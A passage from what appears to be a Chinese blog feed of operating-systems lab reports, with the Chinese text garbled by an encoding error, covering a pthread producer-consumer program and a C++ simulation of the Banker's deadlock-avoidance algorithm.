class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------Thread Execution Table------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|     time     |  buffer data  | current thread | operation |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-comment">//åˆ›å»ºçº¿ç¨‹</span><br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid1, <span class="hljs-literal">NULL</span>, produce, (<span class="hljs-keyword">void</span> *)&amp;t1);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid2, <span class="hljs-literal">NULL</span>, consume, (<span class="hljs-keyword">void</span> *)&amp;t1);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid3, <span class="hljs-literal">NULL</span>, produce, (<span class="hljs-keyword">void</span> *)&amp;t2);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid4, <span class="hljs-literal">NULL</span>, consume, (<span class="hljs-keyword">void</span> *)&amp;t2);<br>    <span class="hljs-comment">//é˜»å¡ç›´åˆ°è¯¥çº¿ç¨‹ç»“æŸ</span><br>    <span class="hljs-built_in">pthread_join</span>(thid1, (<span class="hljs-keyword">void</span> **)&amp;ret1);<br>    <span class="hljs-built_in">pthread_join</span>(thid2, (<span class="hljs-keyword">void</span> **)&amp;ret2);<br>    <span class="hljs-built_in">pthread_join</span>(thid3, (<span class="hljs-keyword">void</span> **)&amp;ret3);<br>    <span class="hljs-built_in">pthread_join</span>(thid4, (<span class="hljs-keyword">void</span> **)&amp;ret4);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;çº¿ç¨‹å…¨éƒ¨æ‰§è¡Œå®Œæ¯•,ä¸»è¿›ç¨‹è¿è¡Œç»“æŸï¼\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>çº¿ç¨‹</p><p><img src="/posts/3994810f/image-20211130090518453.png" alt="image-20211130090518453"></p><p><img src="/posts/3994810f/image-20211130090454157.png" alt="image-20211130090454157"></p><h3 id="äº”-å®éªŒæ€»ç»“"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“"></a> äº”ã€å®éªŒæ€»ç»“</h3><p>æœ¬æ¬¡å®éªŒä¸­æˆ‘å­¦ä¹ åˆ°äº†å¦‚ä½•åˆ©ç”¨å…±äº«å†…å­˜é€šä¿¡æ¥å®ç°è¿›ç¨‹é—´çš„åŒæ­¥å’Œäº’æ–¥ï¼Œå¼€å§‹æ—¶å¯¹shmgetã€shmatã€shmdtã€shmctlè¿™äº›å‡½æ•°ä¸æ˜¯å¾ˆäº†è§£ï¼Œä¹‹åé€šè¿‡æŸ¥é˜…èµ„æ–™äº†è§£äº†ä»–ä»¬çš„ç”¨æ³•ï¼Œåœ¨ç¼–å†™ä»£ç çš„è¿‡ç¨‹ä¹Ÿé‡åˆ°è®¸å¤šå›°éš¾ï¼Œåœ¨æœ€åè°ƒè¯•çš„æ—¶å€™è¿˜é‡åˆ°äº†è¿›ç¨‹æ­»é”çš„é—®é¢˜ï¼Œåæ¥çœ‹äº†åŠå¤©æ‰å‘ç°pvæ“ä½œä¸­ç»™ä¿¡å·é‡è®¾è®¡çš„å‚æ•°é”™è¯¯ï¼Œå¯¼è‡´æ¯æ¬¡è¿›ç¨‹ç»“æŸéƒ½ä¼šè¢«é‡ç½®ï¼Œè¿™å¯¼è‡´äº†æ­»é”ã€‚ä½†å¥½åœ¨æœ€åéƒ½å‘ç°äº†é”™è¯¯ï¼Œé¡ºåˆ©è§£å†³ã€‚</p><p>æ€è€ƒé¢˜è®©æˆ‘ä»¬ç”¨çº¿ç¨‹å®ç°ï¼Œè¿™æ¯”è¿›ç¨‹è¦å®¹æ˜“å¾ˆå¤šï¼Œåªéœ€è¦ç”³è¯·ä¸€ä¸ªå…¨å±€å˜é‡å°±å¯ä»¥ä½œä¸ºå…±äº«å†…å­˜äº†ï¼Œå¯¹äºçº¿ç¨‹éœ€è¦å­¦ä¹ pthread_create å’Œpthread_joinç”¨æ³•ï¼Œæœ€åå¤§éƒ¨åˆ†å‡½æ•°è®¾è®¡æ²¿ç”¨è¿›ç¨‹çš„è®¾è®¡ï¼ŒæˆåŠŸå®ç°ï¼</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒäº”-æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•</title>
    <link href="/posts/ab6ecd69/"/>
    <url>/posts/ab6ecd69/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ul><li>è¿ç”¨æŸç§é«˜çº§è¯­è¨€ï¼ˆå¦‚Cæˆ–C++ï¼‰æ¨¡æ‹Ÿæ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•çš„å¤„ç†è¿‡ç¨‹ã€‚</li></ul><h2 id="äºŒ-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„"></a> äºŒã€å®éªŒç›®çš„</h2><ul><li>æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•æ˜¯é¿å…æ­»é”çš„ä»£è¡¨æ€§ç®—æ³•ã€‚æœ¬å®éªŒæ—¨åœ¨åŠ æ·±äº†è§£æœ‰å…³èµ„æºç”³è¯·ã€é¿å…æ­»é”ã€çŠ¶æ€å®‰å…¨æ€§ç­‰æ¦‚å¿µï¼Œå¹¶ä½“ä¼šå’Œè¿ç”¨é¿å…æ­»é”çš„å…·ä½“å®æ–½æ–¹æ³•ã€‚ç„¶åä¾ç…§æœ¬å®éªŒï¼Œè‡ªè¡Œè®¾è®¡æ¨¡æ‹Ÿç¨‹åº</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><p>æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•çš„æ¨¡æ‹Ÿ</p><ul><li><p>æç¤º1</p><p>æˆ‘ä»¬å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿçœ‹ä½œæ˜¯é“¶è¡Œå®¶ï¼Œæ“ä½œç³»ç»Ÿç®¡ç†çš„èµ„æºç›¸å½“äºé“¶è¡Œå®¶ç®¡ç†çš„èµ„é‡‘ï¼Œè¿›ç¨‹å‘æ“ä½œç³»ç»Ÿè¯·æ±‚åˆ†é…èµ„æºç›¸å½“äºç”¨æˆ·å‘é“¶è¡Œå®¶è´·æ¬¾ã€‚æ“ä½œç³»ç»ŸæŒ‰ç…§é“¶è¡Œå®¶åˆ¶å®šçš„è§„åˆ™ä¸ºè¿›ç¨‹åˆ†é…èµ„æºã€‚</p><p>å½“è¿›ç¨‹é¦–æ¬¡ç”³è¯·èµ„æºæ—¶ï¼Œè¦æµ‹è¯•è¯¥è¿›ç¨‹å¯¹èµ„æºçš„æœ€å¤§éœ€æ±‚é‡ï¼Œå¦‚æœç³»ç»Ÿç°å­˜çš„èµ„æºå¯ä»¥æ»¡è¶³å®ƒçš„æœ€å¤§éœ€æ±‚é‡åˆ™æŒ‰å½“å‰çš„ç”³è¯·é‡åˆ†é…èµ„æºï¼Œå¦åˆ™å°±æ¨è¿Ÿåˆ†é…ã€‚å½“è¿›ç¨‹åœ¨æ‰§è¡Œä¸­ç»§ç»­ç”³è¯·èµ„æºæ—¶ï¼Œå…ˆæµ‹è¯•è¯¥è¿›ç¨‹å·²å ç”¨çš„èµ„æºæ•°ä¸æœ¬æ¬¡ç”³è¯·çš„èµ„æºæ•°ä¹‹å’Œæ˜¯å¦è¶…è¿‡äº†è¯¥è¿›ç¨‹å¯¹èµ„æºçš„æœ€å¤§éœ€æ±‚é‡ã€‚è‹¥è¶…è¿‡åˆ™æ‹’ç»åˆ†é…èµ„æºï¼Œè‹¥æ²¡æœ‰è¶…è¿‡åˆ™å†æµ‹è¯•ç³»ç»Ÿç°å­˜çš„èµ„æºèƒ½å¦æ»¡è¶³è¯¥è¿›ç¨‹å°šéœ€çš„æœ€å¤§èµ„æºé‡ï¼Œè‹¥èƒ½æ»¡è¶³åˆ™æŒ‰å½“å‰çš„ç”³è¯·é‡åˆ†é…èµ„æºï¼Œå¦åˆ™ä¹Ÿè¦æ¨è¿Ÿåˆ†é…ã€‚</p></li><li><p>æç¤º2</p><p>å®‰å…¨çŠ¶æ€ï¼šå¦‚æœå­˜åœ¨ä¸€ä¸ªç”±ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹æ„æˆçš„å®‰å…¨åºåˆ—P1ï¼Œâ€¦ï¼ŒPnï¼Œåˆ™ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ã€‚å®‰å…¨çŠ¶æ€ä¸€å®šæ˜¯æ²¡æœ‰æ­»é”å‘ç”Ÿã€‚</p><p>ä¸å®‰å…¨çŠ¶æ€:ä¸å­˜åœ¨ä¸€ä¸ªå®‰å…¨åºåˆ—ã€‚ä¸å®‰å…¨çŠ¶æ€ä¸€å®šå¯¼è‡´æ­»é”ã€‚</p><p>å®‰å…¨åºåˆ—ï¼šä¸€ä¸ªè¿›ç¨‹åºåˆ—{P1ï¼Œâ€¦ï¼ŒPn}æ˜¯å®‰å…¨çš„ï¼Œå¦‚æœå¯¹äºæ¯ä¸€ä¸ªè¿›ç¨‹Pi(1â‰¤iâ‰¤nï¼‰ï¼Œå®ƒä»¥åå°šéœ€è¦çš„èµ„æºé‡ä¸è¶…è¿‡ç³»ç»Ÿå½“å‰å‰©ä½™èµ„æºé‡ä¸æ‰€æœ‰è¿›ç¨‹Pj (j &lt; i )å½“å‰å æœ‰èµ„æºé‡ä¹‹å’Œã€‚</p></li><li><p>æç¤º3</p><p>è®¾request<sub>i</sub>ä¸ºè¿›ç¨‹p[i]çš„è¯·æ±‚å‘é‡ï¼Œå¦‚æœrequest<sub>i</sub>[j]=Kï¼Œè¡¨ç¤ºè¿›ç¨‹p[i]éœ€è¦Kä¸ªRjèµ„æºã€‚å½“ç³»ç»Ÿå‘å‡ºè¯·æ±‚åï¼Œç³»ç»ŸæŒ‰ä¸‹è¿°æ­¥éª¤å¼€å§‹æ£€æŸ¥ï¼š</p><ol><li><p>å¦‚æœrequest<sub>i</sub>[j]&lt;=need[i][j],è½¬å‘æ­¥éª¤2ï¼›å¦åˆ™æŠ¥å‘Šå‡ºé”™ï¼Œç”³è¯·çš„èµ„æºå·²ç»å¤§äºå®ƒéœ€è¦çš„æœ€å¤§å€¼ã€‚</p></li><li><p>å¦‚æœrequest<sub>i</sub>[j]&lt;=available[j],è½¬å‘æ­¥éª¤3ï¼›å¦åˆ™æŠ¥å‘Šå‡ºé”™ï¼Œå°šæ— è¶³å¤Ÿçš„èµ„æºã€‚</p></li><li><p>ç³»ç»Ÿè¯•æ¢ç€æŠŠèµ„æºåˆ†é…ç»™p[i]ï¼Œå¹¶ä¿®æ”¹ä¸‹åˆ—æ•°æ®ç»“æ„ä¸­çš„å€¼ï¼š</p><p>available[j]=available[j]request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]-request[j]</p></li><li><p>ç³»ç»Ÿè¿›è¡Œå®‰å…¨æ€§ç®—æ³•ï¼Œæ£€æŸ¥æ­¤æ¬¡åˆ†é…åï¼Œç³»ç»Ÿæ˜¯å¦è¿˜å¤„äºå®‰å…¨çŠ¶æ€ï¼Œè‹¥å®‰å…¨ï¼ŒæŠŠèµ„æºåˆ†é…ç»™è¿›ç¨‹p[i]ï¼›å¦åˆ™ï¼Œæ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€ï¼Œè®©è¿›ç¨‹p[i]ç­‰å¾…ã€‚</p></li></ol></li><li><p>æç¤º4</p><p>å®‰å…¨æ€§ç®—æ³•ï¼š<br>int work[RESOURCE_NUMBER]ï¼›<br>bool finish[PROCESS_NUMBER]ï¼›</p><ol><li>Work=Available;<br>Finish=false;</li><li>å¯»æ‰¾æ»¡è¶³æ¡ä»¶çš„iï¼š<br>Aã€Finish[i]=false;<br>Bã€Need[i]â‰¤Work;<br>å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è½¬4)</li><li>Work:=Work+Allocation[i]ï¼› Finish[i]:=trueï¼›è½¬2</li><li>è‹¥å¯¹æ‰€æœ‰i,Finish[i]=true,åˆ™ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ï¼Œ<br>å¦åˆ™å¤„äºä¸å®‰å…¨çŠ¶æ€</li></ol></li><li><p>æç¤º5</p><p>(æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•çš„ç¨‹åºæµç¨‹å›¾)</p><p><img src="/posts/ab6ecd69/image-20211128102425394.png" alt="image-20211128102425394"></p><p><strong>æ€è€ƒé¢˜</strong></p></li></ul><p>è®¾è®¡æœ¬å®éªŒæ—¶ï¼Œå°±å°½å¯èƒ½çš„å°†è®¾è®¡äººæ€§åŒ–å’Œè€ƒè™‘å…¨é¢ã€‚å¦‚ï¼šèƒ½ä¸æ–­åœ°è¿›è¡Œèµ„æºåˆ†é…;èƒ½ä¿®æ”¹èµ„æºçš„åˆå§‹çŠ¶æ€;æç¤ºä¿¡æ¯å°±èƒ½å……åˆ†åæ˜ ç®—æ³•è¿‡ç¨‹ç­‰ã€‚</p><h2 id="å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"></a> å››ã€å®éªŒè®¾è®¡ä¸è¿‡ç¨‹</h2><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"></a> æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//æ¯ç§èµ„æºç°æœ‰çš„å®ä¾‹æ•°é‡</span><br>    Max[N][M],        <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹içš„å¯¹èµ„æºjæœ€å¤§éœ€æ±‚</span><br>    Allocation[N][M], <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹ç°åœ¨æ‰€åˆ†é…çš„æ¯ä¸ªèµ„æºçš„å®ä¾‹æ•°é‡</span><br>    Need[N][M],       <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹è¿˜éœ€è¦çš„å‰©ä½™çš„èµ„æº</span><br>    Request[N][M],    <span class="hljs-comment">//è¿›ç¨‹èµ„æºè¯·æ±‚</span><br>    sign[N],          <span class="hljs-comment">//è®°å½•å®‰å…¨åºåˆ—</span><br>    process_num,      <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br>    recourse_num;     <span class="hljs-comment">//èµ„æºæ•°é‡</span><br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜"></a> å‡½æ•°è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//åˆå§‹åŒ–è¿›ç¨‹èµ„æºçŠ¶å†µ</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//æ‰“å°è¿›ç¨‹èµ„æºè¡¨</span></span><br></code></pre></div></td></tr></table></figure><h5 id="å®‰å…¨æ€§æ£€æŸ¥ç®—æ³•"><a class="markdownIt-Anchor" href="#å®‰å…¨æ€§æ£€æŸ¥ç®—æ³•"></a> <strong>å®‰å…¨æ€§æ£€æŸ¥ç®—æ³•</strong></h5><p>ç®—æ³•æ€è·¯</p><ol><li>åˆå§‹åŒ–Work=Available; Finish=false;</li><li>å¯»æ‰¾æ»¡è¶³æ¡ä»¶çš„iï¼š Aã€Finish[i]=false; Bã€Need[i]â‰¤Work; å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è½¬4)</li><li>Work:=Work+Allocation[i]ï¼› Finish[i]:=trueï¼›åŒæ—¶è®°å½•å®‰å…¨åºåˆ—ï¼›è½¬2</li><li>è‹¥å¯¹æ‰€æœ‰i,Finish[i]=true,åˆ™ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ï¼Œ å¦åˆ™å¤„äºä¸å®‰å…¨çŠ¶æ€</li></ol><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//å®‰å…¨æ€§æ£€æŸ¥</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//åˆå§‹åŒ–work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//è®¾ç½®false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////æ»¡è¶³æ¡ä»¶é‡Šæ”¾èµ„æºï¼Œå¹¶ä»å¤´å¼€å§‹æ‰«æè¿›ç¨‹é›†åˆ</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//å½“è¿›ç¨‹å„ç±»èµ„æºéƒ½æ»¡è¶³NEED&lt;=WORKæ—¶</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//é‡Šæ”¾è¿›ç¨‹</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//è®°å½•ä¸‹æ»¡è¶³æ¡ä»¶çš„è¿›ç¨‹</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//ä»å¤´å¼€å§‹æ‰«æ</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•"><a class="markdownIt-Anchor" href="#æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•"></a> æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•</h5><p>ç®—æ³•æ€è·¯ï¼š</p><ol><li><p>é¦–å…ˆè¿›è¡Œç‰¹æ®Šæƒ…å†µåˆ¤æ–­</p><ul><li>èµ„æºä¸è¶³å’Œç”³è¯·èµ„æºè¶…è¿‡æœ€å¤§è¯·æ±‚</li></ul></li><li><p>ç„¶åå°è¯•è¿›è¡Œèµ„æºåˆ†é…</p><p>available[j]=available[j]request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]-request[j]</p></li><li><p>ç³»ç»Ÿè¿›è¡Œå®‰å…¨æ€§ç®—æ³•ï¼Œæ£€æŸ¥æ­¤æ¬¡åˆ†é…åï¼Œç³»ç»Ÿæ˜¯å¦è¿˜å¤„äºå®‰å…¨çŠ¶æ€ï¼Œè‹¥å®‰å…¨ï¼ŒæŠŠèµ„æºåˆ†é…ç»™è¿›ç¨‹p[i]ï¼›å¦åˆ™ï¼Œæ¢å¤åŸæ¥çš„èµ„æºåˆ†é…çŠ¶æ€ï¼Œè®©è¿›ç¨‹p[i]ç­‰å¾…ã€‚</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//æ“ä½œç³»ç»Ÿç¬¬äº”æ¬¡å®éªŒé“¶è¡Œå®¶ç®—æ³•</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//é¦–å…ˆè¿›è¡Œç‰¹æ®Šæƒ…å†µåˆ¤æ–­</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;æ‰€éœ€èµ„æºæ•°è¶…å‡ºå…¶å®£å¸ƒçš„æœ€å¤§å€¼!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;æ— è¶³å¤Ÿèµ„æºï¼Œp[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]éœ€ç­‰å¾…!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å°è¯•ä¸ºè¿›ç¨‹åˆ†é…èµ„æº</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;å°è¯•è¿›è¡Œèµ„æºåˆ†é…åçš„è¿›ç¨‹èµ„æºè¡¨: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//æ‰§è¡Œå®‰å…¨æ€§ç®—æ³•</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ç»å®‰å…¨æ€§æ£€æŸ¥ï¼Œç³»ç»Ÿå®‰å…¨ï¼Œæœ¬æ¬¡åˆ†é…æˆåŠŸ&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å®‰å…¨è¿›ç¨‹åºåˆ—ä¸ºï¼š&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[i] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>;<span class="hljs-comment">//è¾“å‡ºå®‰å…¨çš„è¿›ç¨‹åºåˆ—</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;å®‰å…¨æ€§æ£€æµ‹å¤±è´¥!ç³»ç»Ÿä¸å®‰å…¨!!!æ­£åœ¨æ¢å¤èµ„æºåˆ†é…------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<span class="hljs-comment">//æ¢å¤è¿›ç¨‹èµ„æºåˆ†é…</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="å®Œæ•´æºä»£ç "><a class="markdownIt-Anchor" href="#å®Œæ•´æºä»£ç "></a> å®Œæ•´æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 